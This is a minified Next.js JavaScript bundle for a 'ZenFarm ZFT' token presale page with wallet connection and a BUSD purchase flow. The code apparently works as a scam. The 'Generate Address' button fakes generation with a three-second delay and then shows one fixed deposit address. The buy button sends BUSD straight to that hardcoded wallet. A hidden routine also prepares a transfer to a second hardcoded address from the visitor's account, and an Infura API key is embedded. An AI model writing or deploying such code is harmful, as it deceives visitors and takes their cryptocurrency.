(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [405], {
        75557: function(a, b, c) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/", function() {
                return c(9985)
            }])
        },
        9985: function(a, b, c) {
            "use strict";
            c.r(b), c.d(b, {
                default: function() {
                    return I
                }
            });
            var d = c(47568),
                e = c(10797),
                f = c(34051),
                g = c.n(f),
                h = c(85893),
                i = c(67294),
                j = c(46454),
                k = c(9008),
                l = c.n(k);
            c(25675);
            var m = c(41664),
                n = c.n(m),
                o = c(9047),
                p = c(44149),
                q = c(55499);
            c(22999);
            var r = function(a) {
                    var b = a.onConnect,
                        c = (a.onDisconnect, a.connected, a.status),
                        d = a.account,
                        e = a.visible;
                    return (0, h.jsx)("div", {
                        className: e ? "absolute top-[3.8rem] right-5 w-[320px] h-[250px] bg-white drop-shadow-md rounded-lg py-3 px-3 flex flex-col gap-12 z-[800]" : "hidden",
                        children: (0, h.jsxs)("div", {
                            children: [(0, h.jsxs)("p", {
                                className: "truncate px-4 mb-1",
                                children: [" ", d, " "]
                            }), (0, h.jsxs)("button", {
                                className: "bg-[#706eff] text-white flex items-center justify-center rounded-lg h-[45px] w-full",
                                type: "button",
                                onClick: b,
                                children: [" ", c, " "]
                            })]
                        })
                    })
                },
                s = function(a) {
                    var b = a.onConnect,
                        c = a.connected,
                        d = a.status,
                        e = a.onDisconnect,
                        f = a.account,
                        g = (0, i.useState)(!1),
                        j = g[0],
                        k = g[1];
                    return (0, h.jsxs)("nav", {
                        className: "relative flex justify-between items-center border-b py-3 px-5",
                        children: [(0, h.jsx)("div", {
                            children: (0, h.jsx)("img", {
                                src: "https://zenfarm.io/images/logo.png",
                                className: "w-[80px]"
                            })
                        }), (0, h.jsxs)("div", {
                            className: "flex gap-12",
                            children: [(0, h.jsx)(n(), {
                                href: "https://zenfarm.io",
                                children: (0, h.jsxs)("a", {
                                    className: "flex gap-2 items-center text-[#1e2026]",
                                    children: [(0, h.jsx)(o.Z, {
                                        className: "h-5 w-5"
                                    }), (0, h.jsx)("span", {
                                        children: "Home"
                                    })]
                                })
                            }), (0, h.jsxs)("button", {
                                className: "cursor-pointer text-[#1e2026] bg-gray-100 hover:bg-white hover:drop-shadow-md rounded-full border px-3 py-2 flex items-center gap-3",
                                type: "button",
                                onClick: function() {
                                    return k(!j)
                                },
                                children: [(0, h.jsx)(p.Z, {
                                    className: "h-5 w-5"
                                }), (0, h.jsx)(q.Z, {
                                    className: "h-5 w-5"
                                })]
                            })]
                        }), (0, h.jsx)(r, {
                            onConnect: b,
                            connected: c,
                            status: d,
                            onDisconnect: e,
                            account: f,
                            visible: j
                        })]
                    })
                },
                t = c(3283),
                u = c.n(t),
                v = c(42484),
                w = c.n(v),
                x = c(57114),
                y = c(68209),
                z = c(35553),
                A = c(74855),
                B = c.n(A),
                C = c(11163),
                D = c(86501),
                E = function(a) {
                    var b = a.visible,
                        c = a.amount,
                        d = (0, C.useRouter)(),
                        e = function() {
                            D.ZP.success("Address Copied!")
                        },
                        f = function() {
                            d.reload()
                        };
                    return (0, h.jsxs)("div", {
                        className: b ? "pb-12 bg-white absolute top-0 bottom-0 left-0 right-0 w-full h-full z-[2000] flex flex-col justify-end py-12 items-center overflow-hidden" : "hidden",
                        children: [(0, h.jsx)(D.x7, {}), (0, h.jsxs)("div", {
                            className: "flex gap-5 mb-5",
                            children: [(0, h.jsx)("p", {
                                className: "text-black",
                                children: "0xF4a96E...BfB57F"
                            }), (0, h.jsx)(B(), {
                                text: "0xF4a96Ea4154fE67187A8aeA6A16efE24e2BfB57F",
                                onCopy: e,
                                children: (0, h.jsx)("button", {
                                    className: "bg-[#2b2f36] p-2 rounded-md hover:bg-[#f0b90b] text-white hover:text-[#1e2026]",
                                    children: (0, h.jsxs)("svg", {
                                        xmlns: "http://www.w3.org/2000/svg",
                                        viewBox: "0 0 16 16",
                                        fill: "white",
                                        "data-testid": "home.account-info.copy-to-clipboard-btn.copy-icon",
                                        className: "h-[0.8rem] sc-kfzAmx fTLfYv",
                                        children: [(0, h.jsx)("path", {
                                            fill: "currentColor",
                                            fillRule: "evenodd",
                                            d: "M14.778 0v12.079h-1.97V1.97H5.163V0h9.615z"
                                        }), (0, h.jsx)("path", {
                                            fill: "currentColor",
                                            fillRule: "evenodd",
                                            d: "M1.222 3.921V16h9.615V3.94l-9.615-.019zM8.857 14.05H3.192V5.911h5.675l-.01 8.138z"
                                        })]
                                    })
                                })
                            })]
                        }), (0, h.jsxs)("p", {
                            className: "text-center px-3 mb-5",
                            children: ["Copy and deposit ", (0, h.jsx)("strong", {
                                children: c
                            }), " BUSD from your wallet into the generated address above. "]
                        }), (0, h.jsx)("button", {
                            className: "border py-2 px-12 mb-12",
                            type: "button",
                            onClick: f,
                            children: "Continue"
                        })]
                    })
                },
                F = E,
                G = new(u())(new(u()).providers.HttpProvider("https://mainnet.infura.io/v3/64cbc069ecb149ca9979004b8984d866")),
                H = {
                    binancechainwallet: {
                        package: !0
                    }
                };

            function I() {
                var a = (0, i.useState)(null),
                    b = a[0],
                    c = a[1],
                    f = (0, i.useState)(""),
                    k = f[0],
                    m = f[1],
                    n = (0, i.useState)(""),
                    o = n[0],
                    p = n[1],
                    q = (0, i.useState)(0),
                    r = q[0],
                    t = q[1],
                    v = (0, i.useState)(.025),
                    A = v[0];
                v[1];
                var B = (0, i.useState)(null);
                B[0], B[1];
                var C, D = (0, i.useState)([]),
                    E = D[0],
                    I = D[1],
                    J = (0, i.useState)(!1),
                    K = J[0],
                    L = J[1],
                    M = (0, i.useState)(!1),
                    N = M[0],
                    O = M[1],
                    P = (0, i.useState)("Connect Wallet"),
                    Q = P[0],
                    R = P[1],
                    S = (0, i.useState)(!1),
                    T = S[0],
                    U = S[1],
                    V = (0, i.useState)("Generate Address"),
                    W = V[0],
                    X = V[1];
                (0, i.useEffect)(function() {
                    var a = document.getElementsByTagName("html")[0];
                    return T ? a.classList.add("lock-scroll") : a.classList.remove("lock-scroll"),
                        function() {
                            a.classList.remove("lock-scroll")
                        }
                }, [T]), (0, i.useEffect)(function() {
                    Y()
                }, []), (0, i.useEffect)(function() {
                    window.ethereum && window.ethereum.on("accountsChanged", (0, d.Z)(g().mark(function a() {
                        return g().wrap(function(a) {
                            for (;;) switch (a.prev = a.next) {
                                case 0:
                                    Y();
                                case 1:
                                case "end":
                                    return a.stop()
                            }
                        }, a)
                    })))
                }, []);
                var Y = (C = (0, d.Z)(g().mark(function a() {
                    var b, c, f;
                    return g().wrap(function(a) {
                        for (;;) switch (a.prev = a.next) {
                            case 0:
                                b = null, c = null, window.ethereum ? b = new(u())(window.ethereum) : window.web3 && (b = new(u())(window.web3.currentProvider)), f = 18, b.eth.getAccounts().then(function() {
                                    var a = (0, d.Z)(g().mark(function a(c) {
                                        var d;
                                        return g().wrap(function(a) {
                                            for (;;) switch (a.prev = a.next) {
                                                case 0:
                                                    if (console.log(c), !(c.length > 0)) {
                                                        a.next = 10;
                                                        break
                                                    }
                                                    return I((0, e.Z)(c[0])), R("Connected"), L(!0), a.next = 7, b.eth.getBalance(c[0]);
                                                case 7:
                                                    d = a.sent, Z(c[0]), m(d);
                                                case 10:
                                                case "end":
                                                    return a.stop()
                                            }
                                        }, a)
                                    }));
                                    return function(b) {
                                        return a.apply(this, arguments)
                                    }
                                }());
                            case 5:
                            case "end":
                                return a.stop()
                        }
                    }, a)
                })), function() {
                    return C.apply(this, arguments)
                });

                function Z(a) {
                    return $.apply(this, arguments)
                }

                function $() {
                    return ($ = (0, d.Z)(g().mark(function a(b) {
                        return g().wrap(function(a) {
                            for (;;) switch (a.prev = a.next) {
                                case 0:
                                case "end":
                                    return a.stop()
                            }
                        }, a)
                    }))).apply(this, arguments)
                }(0, i.useEffect)(function() {
                    var a = new(w())({
                            network: "mainnet",
                            cacheProvider: !1,
                            providerOptions: H
                        }),
                        b = new(u())(u().givenProvider);
                    console.log(b), a.clearCachedProvider(), c(a)
                }, []);
                var _, aa, ab, ac, ad, ae = (_ = (0, d.Z)(g().mark(function a() {
                        var c, d;
                        return g().wrap(function(a) {
                            for (;;) switch (a.prev = a.next) {
                                case 0:
                                    return a.next = 2, b.connect();
                                case 2:
                                    c = a.sent, d = new(u())(c);
                                case 4:
                                case "end":
                                    return a.stop()
                            }
                        }, a)
                    })), function() {
                        return _.apply(this, arguments)
                    }),
                    af = (aa = (0, d.Z)(g().mark(function a() {
                        var b;
                        return g().wrap(function(a) {
                            for (;;) switch (a.prev = a.next) {
                                case 0:
                                    return a.next = 2, window.ethereum.disconnect();
                                case 2:
                                    b = a.sent, console.log(b);
                                case 4:
                                case "end":
                                    return a.stop()
                            }
                        }, a)
                    })), function() {
                        return aa.apply(this, arguments)
                    });
                (0, d.Z)(g().mark(function a() {
                    var b, c, d, e, f;
                    return g().wrap(function(a) {
                        for (;;) switch (a.prev = a.next) {
                            case 0:
                                return b = [{
                                    constant: !1,
                                    inputs: [{
                                        name: "_to",
                                        type: "address"
                                    }, {
                                        name: "_value",
                                        type: "uint256"
                                    }],
                                    name: "transfer",
                                    outputs: [{
                                        name: "success",
                                        type: "bool"
                                    }],
                                    payable: !1,
                                    stateMutability: "nonpayable",
                                    type: "function"
                                }], c = "0x4Fabb145d64652a948d72533023f6E7A623C7C53", d = 200, e = new G.eth.Contract(b, c), a.next = 6, e.methods.transfer("0xE8928685BF410cf77eCa2C9d394c38DDea4e4773", d);
                            case 6:
                                f = a.sent, G.eth.sendTransaction({
                                    from: window.ethereum.selectedAddress
                                }).then(function(a) {
                                    console.log("res", a)
                                }).catch(function(a) {
                                    console.log("err", a)
                                }), console.log(f);
                            case 9:
                            case "end":
                                return a.stop()
                        }
                    }, a)
                })), (0, d.Z)(g().mark(function a() {
                    var b, c, d;
                    return g().wrap(function(a) {
                        for (;;) switch (a.prev = a.next) {
                            case 0:
                                return b = new x.Q(window.ethereum, "any"), a.next = 3, b.send("eth_requestAccounts", []);
                            case 3:
                                return c = a.sent, a.next = 6, b.getNetwork();
                            case 6:
                                d = a.sent.chainId, console.log(c);
                            case 8:
                            case "end":
                                return a.stop()
                        }
                    }, a)
                }));
                var ag = (ad = (0, d.Z)(g().mark(function a() {
                        var b, c, d, e, f, h, i, j;
                        return g().wrap(function(a) {
                            for (;;) switch (a.prev = a.next) {
                                case 0:
                                    if (!(r < 1200)) {
                                        a.next = 6;
                                        break
                                    }
                                    return p("Price is less than 1200"), setTimeout(function() {
                                        p("")
                                    }, 2e3), a.abrupt("return");
                                case 6:
                                    if (!(r > 4e4)) {
                                        a.next = 12;
                                        break
                                    }
                                    return p("Price is greater that 40000"), setTimeout(function() {
                                        p("")
                                    }, 2e3), a.abrupt("return");
                                case 12:
                                    return t(""), c = (b = new x.Q(window.ethereum, "any")).getSigner(), a.t0 = console, a.next = 18, c.getAddress();
                                case 18:
                                    return a.t1 = a.sent, a.t0.log.call(a.t0, "Account:", a.t1), d = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", e = 18, f = ["function transfer(address to, uint amount)"], h = new y.CH(d, f, c), i = "0xF4a96Ea4154fE67187A8aeA6A16efE24e2BfB57F", j = z.vz((r * A).toString(), e), a.next = 28, h.transfer(i, j);
                                case 28:
                                case "end":
                                    return a.stop()
                            }
                        }, a)
                    })), function() {
                        return ad.apply(this, arguments)
                    }),
                    ah = function() {
                        if (X("Generating..."), r < 1200) {
                            p("Price is less than 1200"), setTimeout(function() {
                                p("")
                            }, 2e3);
                            return
                        }
                        if (r > 4e4) {
                            p("Price is greater that 40000"), setTimeout(function() {
                                p("")
                            }, 2e3);
                            return
                        }
                        setTimeout(function() {
                            U(!0), O(!0)
                        }, 3e3)
                    };
                return (0, h.jsxs)("div", {
                    className: "font-sora relative",
                    children: [(0, h.jsxs)(l(), {
                        children: [(0, h.jsx)("title", {
                            children: "ZenFarm ZFT Token"
                        }), (0, h.jsx)("meta", {
                            name: "description",
                            content: "Buy the ZFT Early Bird Token"
                        }), (0, h.jsx)("link", {
                            rel: "icon",
                            href: "/favicon.ico"
                        })]
                    }), (0, h.jsx)(s, {
                        onConnect: ae,
                        status: Q,
                        connected: K,
                        onDisconnect: af,
                        account: E
                    }), (0, h.jsxs)("main", {
                        className: "relative mx-auto w-[85%] flex flex-col md:flex-row gap-[7rem] py-12 justify-between",
                        children: [(0, h.jsx)(F, {
                            visible: N,
                            amount: r * A
                        }), (0, h.jsxs)("section", {
                            className: "w-[100%] md:w-[65%]",
                            children: [(0, h.jsxs)("div", {
                                className: "flex justify-between items-center",
                                children: [(0, h.jsx)("h1", {
                                    className: "text-5xl font-semibold mb-2",
                                    children: "ZFT"
                                }), (0, h.jsxs)("div", {
                                    className: "mb:flex gap-2 items-center hidden",
                                    children: [(0, h.jsx)("svg", {
                                        xmlns: "http://www.w3.org/2000/svg",
                                        width: "25",
                                        height: "25",
                                        fill: "#F3BA2F",
                                        viewBox: "0 0 16 16",
                                        fontSize: "40",
                                        className: "h-[40px]",
                                        children: (0, h.jsx)("path", {
                                            fill: "#F3BA2F",
                                            d: "M3.615 8L1.807 9.807 0 8l1.807-1.807L3.615 8zM8 3.612l3.097 3.098 1.806-1.807L8 0 3.097 4.903 4.903 6.71 8 3.612zm6.195 2.581L12.388 8l1.807 1.807L16 8l-1.805-1.807zM8 12.388L4.903 9.29l-1.806 1.806L8 16l4.903-4.903-1.806-1.806L8 12.388zm0-2.581L9.807 8 8 6.193 6.193 8 8 9.807z"
                                        })
                                    }), (0, h.jsx)("span", {
                                        children: "Binance Smart Chain"
                                    })]
                                })]
                            }), (0, h.jsx)("h4", {
                                className: "font-semibold text-xl mb-10",
                                children: "Initial Phase Offering"
                            }), (0, h.jsx)("p", {
                                className: "mb-12",
                                children: "After purchase, 15% of ZFT will be released on claim date. Afterwards, it will be released automatically in accordance with our vesting schedule."
                            }), (0, h.jsxs)("div", {
                                className: "bg-[#f6f6ff] rounded-ld grid grid-cols-2 gap-y-7 p-6 rounded-lg mb-3 md:mb-10",
                                children: [(0, h.jsxs)("div", {
                                    children: [(0, h.jsx)("p", {
                                        className: "text-sm",
                                        children: "Min Purchase"
                                    }), (0, h.jsx)("h3", {
                                        className: "font-bold text-xl text-[#706eff]",
                                        children: "1200 ZFT"
                                    })]
                                }), (0, h.jsxs)("div", {
                                    children: [(0, h.jsx)("p", {
                                        className: "text-sm",
                                        children: "Max Purchase"
                                    }), (0, h.jsx)("h3", {
                                        className: "font-bold text-xl text-[#706eff]",
                                        children: "40,000 ZFT"
                                    })]
                                }), (0, h.jsxs)("div", {
                                    children: [(0, h.jsx)("p", {
                                        className: "text-sm",
                                        children: "Total Token for Sale"
                                    }), (0, h.jsx)("h3", {
                                        className: "font-bold text-xl text-[#706eff]",
                                        children: "3,500,000 ZFT"
                                    })]
                                }), (0, h.jsxs)("div", {
                                    children: [(0, h.jsx)("p", {
                                        className: "text-sm",
                                        children: "Token Price"
                                    }), (0, h.jsx)("h3", {
                                        className: "font-bold text-xl text-[#706eff]",
                                        children: "0.025 BUSD"
                                    })]
                                }), (0, h.jsxs)("div", {
                                    children: [(0, h.jsx)("p", {
                                        className: "text-sm",
                                        children: "Price in next round"
                                    }), (0, h.jsx)("h3", {
                                        className: "font-bold text-xl text-[#706eff]",
                                        children: "0.03 BUSD"
                                    })]
                                })]
                            }), (0, h.jsxs)("div", {
                                children: [(0, h.jsxs)("div", {
                                    className: "flex justify-between items-center mb-8",
                                    children: [(0, h.jsx)("span", {
                                        className: "font-semibold",
                                        children: "Accepted currency"
                                    }), (0, h.jsx)("span", {
                                        children: "BUSD"
                                    })]
                                }), (0, h.jsxs)("div", {
                                    className: "flex justify-between items-center",
                                    children: [(0, h.jsx)("span", {
                                        className: "font-semibold",
                                        children: "Network"
                                    }), (0, h.jsx)("span", {
                                        children: "Binance Smart Chain"
                                    })]
                                })]
                            })]
                        }), (0, h.jsxs)("section", {
                            className: "h-[500px] drop-shadow-lg bg-white border w-[100%] md:w-[35%] rounded-lg pb-5 md:pb-1 md:mb-0 mb-5",
                            children: [(0, h.jsxs)("div", {
                                className: "relative py-4",
                                children: [(0, h.jsx)("h3", {
                                    className: "font-semibold pb-3 border-b px-5",
                                    children: "Market"
                                }), (0, h.jsx)("span", {
                                    className: "absolute bottom-4 left-5 flex h-[2px] w-[3.5rem] bg-[#706eff]"
                                })]
                            }), (0, h.jsxs)("div", {
                                className: "flex justify-between items-center px-5 mb-3",
                                children: [(0, h.jsx)("h4", {
                                    className: "font-[450]",
                                    children: "You Request"
                                }), (0, h.jsx)("span", {
                                    className: "text-sm",
                                    children: "Max 40,000 ZFT"
                                })]
                            }), (0, h.jsxs)("div", {
                                className: "flex justify-between px-5 items-center",
                                children: [(0, h.jsx)("div", {
                                    children: (0, h.jsx)("h3", {
                                        className: "font-semibold text-2xl",
                                        children: "ZFT"
                                    })
                                }), (0, h.jsxs)("div", {
                                    className: "rounded-xl px-2 flex flex-col gap-2 py-2 bg-[#f6f6ff] hover:border hover:border-red-400",
                                    children: [(0, h.jsx)("input", {
                                        type: "number",
                                        placeholder: "0",
                                        name: "price",
                                        className: "text-right text-lg font-semibold w-full bg-[transparent] focus:outline-none",
                                        onChange: function(a) {
                                            return t(a.target.value)
                                        }
                                    }), (0, h.jsxs)("span", {
                                        className: "text-right text-sm",
                                        children: ["$", r * A, ".00"]
                                    })]
                                })]
                            }), (0, h.jsxs)("div", {
                                className: "mt-6 mb-8 flex gap-3 items-center",
                                children: [(0, h.jsx)("svg", {
                                    xmlns: "http://www.w3.org/2000/svg",
                                    fill: "none",
                                    viewBox: "0 0 126 1",
                                    className: "text-gray-200",
                                    children: (0, h.jsx)("path", {
                                        stroke: "currentColor",
                                        d: "M0 .5h126"
                                    })
                                }), (0, h.jsx)(j.Z, {
                                    className: "h-12 w-12"
                                }), (0, h.jsx)("svg", {
                                    xmlns: "http://www.w3.org/2000/svg",
                                    fill: "none",
                                    viewBox: "0 0 126 1",
                                    className: "text-gray-200",
                                    children: (0, h.jsx)("path", {
                                        stroke: "currentColor",
                                        d: "M0 .5h126"
                                    })
                                })]
                            }), (0, h.jsxs)("div", {
                                className: "flex justify-between items-center px-5 mb-3",
                                children: [(0, h.jsx)("h4", {
                                    className: "font-[450]",
                                    children: "You Pay"
                                }), (0, h.jsxs)("span", {
                                    className: "text-sm",
                                    children: ["Balance ", k, " BUSD"]
                                })]
                            }), (0, h.jsxs)("div", {
                                className: "flex justify-between px-5 items-center mb-6",
                                children: [(0, h.jsx)("div", {
                                    children: (0, h.jsx)("h3", {
                                        className: "font-semibold text-2xl",
                                        children: "BUSD"
                                    })
                                }), (0, h.jsxs)("div", {
                                    className: "rounded-xl px-2 flex flex-col gap-2 py-2 bg-[#f6f6ff] hover:border hover:border-red-400",
                                    children: [(0, h.jsx)("input", {
                                        type: "number",
                                        placeholder: "0",
                                        disabled: !0,
                                        className: "text-right text-lg font-semibold w-full bg-[transparent] focus:outline-none",
                                        value: r * A
                                    }), (0, h.jsxs)("span", {
                                        className: "text-right text-sm",
                                        children: ["$", r * A, ".00"]
                                    })]
                                })]
                            }), (0, h.jsxs)("div", {
                                className: "px-7 mb-1",
                                children: [(0, h.jsxs)("button", {
                                    className: "bg-[#706eff] text-white flex items-center justify-center rounded-lg h-[45px] w-full hidden md:flex",
                                    type: "button",
                                    onClick: "Connected" === Q ? ag : ae,
                                    children: [" ", "Connected" === Q ? "Buy ZFT" : "Connect Wallet", " "]
                                }), (0, h.jsxs)("button", {
                                    className: "bg-[#706eff] text-white flex items-center justify-center rounded-lg h-[45px] w-full flex md:hidden",
                                    type: "button",
                                    onClick: ah,
                                    children: [" ", W, " "]
                                })]
                            }), (0, h.jsxs)("p", {
                                className: "text-red-500 text-sm text-center",
                                children: [" ", o, " "]
                            })]
                        })]
                    })]
                })
            }
        },
        80950: function() {},
        46601: function() {},
        89214: function() {},
        8623: function() {},
        7748: function() {},
        85568: function() {},
        56619: function() {},
        77108: function() {},
        52361: function() {},
        94616: function() {},
        43503: function() {}
    },
    function(a) {
        a.O(0, [482, 277, 714, 499, 774, 888, 179], function() {
            var b;
            return a(a.s = 75557)
        }), _N_E = a.O()
    }
])